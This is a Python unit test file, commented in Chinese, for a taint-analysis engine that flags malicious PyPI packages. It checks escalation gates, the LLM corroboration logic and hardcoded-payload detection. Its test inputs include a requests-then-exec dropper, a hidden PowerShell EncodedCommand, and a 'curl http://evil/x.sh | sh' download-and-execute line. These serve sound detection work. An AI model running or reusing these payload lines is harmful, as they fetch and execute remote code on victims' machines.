"""SUSPICIOUS 升级门控单元测试（2026-11 架构层修复）

门控实现在 src/taint_engine.py（在线投票与离线重判共用同一份逻辑）。
验证：
  A. 强污点链（强源→sink / 任意→外传）→ 升级
  B. environment→exec 等良性常见链形态 → 不自动升级（保持 SUSPICIOUS）
  C. 边界（空链/缺字段/多链）
  D. 常量完备性（与引擎 Source/Sink 类别对齐）
不调用 LLM / 不联网。
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from src.taint_engine import (
    escalation_gate,
    STRONG_SOURCES,
    EXFIL_SINKS,
    SOURCE_PATTERNS,
    SINK_PATTERNS,
)

PASS = 0
FAIL = 0


def check(name, cond, detail=''):
    global PASS, FAIL
    if cond:
        PASS += 1
        print(f"  [PASS] {name}")
    else:
        FAIL += 1
        print(f"  [FAIL] {name} {detail}")


def chain(src, sink, cross_file=False, conf=0.9):
    return {'source_category': src, 'sink_category': sink,
            'cross_file': cross_file, 'confidence': conf,
            'steps': [{'stage': 'source', 'code': 'x'}, {'stage': 'sink', 'code': 'y'}]}


print("=== 1. 强源升级门控 ===")
check("network→exec 升级",
      escalation_gate([chain('network_response', 'code_execution')]).startswith('污点链'))
check("socket_recv→cmd 升级",
      escalation_gate([chain('socket_recv', 'command_execution')]).startswith('污点链'))
check("deserialization→file_write 升级",
      escalation_gate([chain('deserialization', 'file_write')]).startswith('污点链'))
check("decoded_data→network 升级",
      escalation_gate([chain('decoded_data', 'data_exfiltration')]).startswith('污点链'))

print("=== 2. 外传 sink 升级门控 ===")
check("environment→exfil 升级",
      escalation_gate([chain('environment', 'data_exfiltration')]).startswith('污点链'))
check("file_read→exfil 升级",
      escalation_gate([chain('file_read', 'data_exfiltration')]).startswith('污点链'))

print("=== 3. 良性常见形态不升级 ===")
check("environment→exec 不升级",
      escalation_gate([chain('environment', 'code_execution')]) == '',
      detail=escalation_gate([chain('environment', 'code_execution')]))
check("file_read→file_write 不升级",
      escalation_gate([chain('file_read', 'file_write')]) == '')
check("user_input→cmd 不升级",
      escalation_gate([chain('user_input', 'command_execution')]) == '')
check("cli_args→exec 不升级",
      escalation_gate([chain('cli_args', 'code_execution')]) == '')

print("=== 4. 边界 ===")
check("空链返回空", escalation_gate([]) == '')
check("None 返回空", escalation_gate(None) == '')
check("空dict链返回空", escalation_gate([{}]) == '')
check("多链命中强源", escalation_gate([
    chain('environment', 'code_execution'), chain('network_response', 'code_execution')]).startswith('污点链'))

print("=== 5. 常量完备性 ===")
engine_sources = {cat for _, cat in SOURCE_PATTERNS}
engine_sources.add('hardcoded_payload')  # 由 HARDCODED_PAYLOAD_PATTERNS 独立产出
engine_sinks = {cat for _, cat in SINK_PATTERNS}
check("强源集合 <= 引擎 Source 类别", STRONG_SOURCES <= engine_sources,
      detail=f"{STRONG_SOURCES - engine_sources}")
check("外传 sink ∈ 引擎 Sink 类别", EXFIL_SINKS <= engine_sinks,
      detail=f"{EXFIL_SINKS - engine_sinks}")

print("=== 6. 包级代码证据组装（bug② 深层修复）===")
from batch_solution_b_v2 import _flagged_code_signals
def sg_node(code, line):
    return {'line': line, 'code': code}

subs = [
    {'subgraph_name': 'dropper', 'nodes': [
        sg_node('import requests', 1),
        sg_node('data = requests.get(url).text', 2),
        sg_node('exec(data)', 3),
    ]},
    {'subgraph_name': 'clean_func', 'nodes': [sg_node('print("hi")', 1)]},
]
verdicts = [
    {'subgraph_name': 'dropper', 'final_verdict': 'SUSPICIOUS'},
    {'subgraph_name': 'clean_func', 'final_verdict': 'BENIGN'},
]
sig = _flagged_code_signals(verdicts, subs)
joined = '\n'.join(sig)
check("包含可疑子图代码头", "Code of flagged subgraph 'dropper'" in joined)
check("包含代码原文 exec(data)", 'exec(data)' in joined)
check("不包含良性子图代码", 'print("hi")' not in joined)
check("预算头说明", 'judge from the code itself' in joined)
check("无 flagged 返回空", _flagged_code_signals([], subs) == [])
check("subgraph_jsons=None 安全", _flagged_code_signals(verdicts, None) == [])

big_nodes = [{'line': i, 'code': 'x' * 100} for i in range(30)]
big_subs = [{'subgraph_name': 'huge', 'nodes': big_nodes}]
big_v = [{'subgraph_name': 'huge', 'final_verdict': 'SUSPICIOUS'}]
big_sig = '\n'.join(_flagged_code_signals(big_v, big_subs))
check("超长代码截断(1200字符预算)", '...' in big_sig and len(big_sig) < 2200)

print("=== 7. 包级 LLM 升级机械复核门（2026-11）===")
from batch_solution_b_v2 import _llm_escalation_corroborated

def vr(chains=None):
    return {'subgraph_verdicts': [{'final_verdict': 'SUSPICIOUS',
                                   'taint_chains': chains or []}]}

ok, why = _llm_escalation_corroborated(
    {'overall_threat_level': 'high', 'pypi_verification': {'status': 'exists'}}, vr())
check("high 信号 + 无链 + exists → 驳回", not ok, detail=why)

ok, why = _llm_escalation_corroborated(
    {'overall_threat_level': 'critical', 'pypi_verification': {'status': 'exists'}}, vr())
check("critical → 放行", ok)

ok, why = _llm_escalation_corroborated(
    {'overall_threat_level': 'high', 'pypi_verification': {'status': 'not_found'}}, vr())
check("PyPI 404 → 放行", ok)

ok, why = _llm_escalation_corroborated(
    {'overall_threat_level': 'safe', 'pypi_verification': {'status': 'exists'}},
    vr([{'source_category': 'network_response', 'sink_category': 'code_execution'}]))
check("强链 → 放行", ok)

ok, why = _llm_escalation_corroborated(
    {'overall_threat_level': 'safe', 'pypi_verification': {'status': 'exists'}},
    vr([{'source_category': 'environment', 'sink_category': 'code_execution'}]))
check("弱链 → 驳回", not ok, detail=why)

ok, why = _llm_escalation_corroborated(None, vr())
check("增强结果缺失 → 驳回(默认保守)", not ok)

# 回归(ag2 误报): BENIGN 子图的强链不能当作升级依据
mixed = {'subgraph_verdicts': [
    {'final_verdict': 'BENIGN',
     'taint_chains': [{'source_category': 'network_response',
                       'sink_category': 'code_execution'}]},
    {'final_verdict': 'SUSPICIOUS',
     'taint_chains': [{'source_category': 'environment',
                       'sink_category': 'command_execution'}]},
]}
ok, why = _llm_escalation_corroborated(
    {'overall_threat_level': 'high', 'pypi_verification': {'status': 'exists'}}, mixed)
check("BENIGN子图的强链不算证据(ag2回归)", not ok, detail=why)

print("=== 8. 零容忍强证据门控（2026-11，ag2 误报驱动）===")
from batch_solution_b_v2 import _llm_malicious_weak_only

def lmv(cats):
    return [{'final_verdict': 'MALICIOUS', 'llm_used': True,
             'taint_chains': [{'source_category': s, 'sink_category': k} for s, k in cats]}]

# exec(open(_version.py).read()) 的典型形态:弱源 → 代码执行
weak = lmv([('file_read', 'code_execution')])
check("弱链(file_read→exec) → 降级",
      len(_llm_malicious_weak_only(weak, {'overall_threat_level': 'high'})) == 1)
check("弱链 + 增强critical → 不降级(独立铁证)",
      _llm_malicious_weak_only(weak, {'overall_threat_level': 'critical'}) == [])
check("弱链 + PyPI 404 → 不降级",
      _llm_malicious_weak_only(
          weak, {'overall_threat_level': 'high',
                 'pypi_verification': {'status': 'not_found'}}) == [])
check("强链(network→exec) → 不降级",
      _llm_malicious_weak_only(
          lmv([('network_response', 'code_execution')]),
          {'overall_threat_level': 'high'}) == [])
check("混合:一个强链即可保留零容忍",
      _llm_malicious_weak_only(
          lmv([('file_read', 'code_execution'),
               ('decoded_data', 'code_execution')]),
          {'overall_threat_level': 'high'}) == [])
check("无 LLM 恶意子图 → 返回空", _llm_malicious_weak_only([], {}) == [])
check("无链信息的恶意子图 → 不降级(不等于弱链)",
      _llm_malicious_weak_only(
          [{'final_verdict': 'MALICIOUS', 'llm_used': True}],
          {'overall_threat_level': 'high'}) == [])

print("=== 9. 硬编码载荷作为 source（2026-11，EsqueleSquad 家族驱动）===")
from src.taint_engine import analyze as taint_analyze, HARDCODED_PAYLOAD_PATTERNS

def taint(code, nid='n1'):
    nodes = [{'node_id': nid, 'code': code, 'line': 8, 'file': 'setup.py', 'type': 'call'}]
    edges = [{'from_node': nid, 'to_node': nid, 'kind': 'data'}]
    return taint_analyze(nodes, edges)

# 真实形态：PowerShell EncodedCommand 直接执行
ps = ("subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand "
      "cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdA==', "
      "shell=False)")
c = taint(ps)
hw = [x for x in c if x['source_category'] == 'hardcoded_payload']
check("PowerShell EncodedCommand → hardcoded_payload 链", len(hw) == 1)
check("链被门控认可为强源", bool(escalation_gate(hw)))
check("payload_kind 归类", hw and hw[0].get('payload_kind') == 'powershell_encoded')

# curl | sh
c2 = [x for x in taint("os.system('curl http://evil/x.sh | sh')")
      if x['source_category'] == 'hardcoded_payload']
check("下载管道执行 → hardcoded_payload", len(c2) == 1)

# 反例：普通 base64 字面量不触发
c3 = [x for x in taint("exec(base64.b64decode('aGVsbG8='))")
      if x['source_category'] == 'hardcoded_payload']
check("普通 base64 不触发（防误报）", len(c3) == 0)

# 反例：普通 subprocess 调用不触发
c4 = [x for x in taint("subprocess.run(['ls', '-la'])")
      if x['source_category'] == 'hardcoded_payload']
check("普通 subprocess 不触发", len(c4) == 0)

check("hardcoded_payload 在 STRONG_SOURCES", 'hardcoded_payload' in STRONG_SOURCES)

print(f"\n结果: {PASS} 通过, {FAIL} 失败")
sys.exit(1 if FAIL else 0)
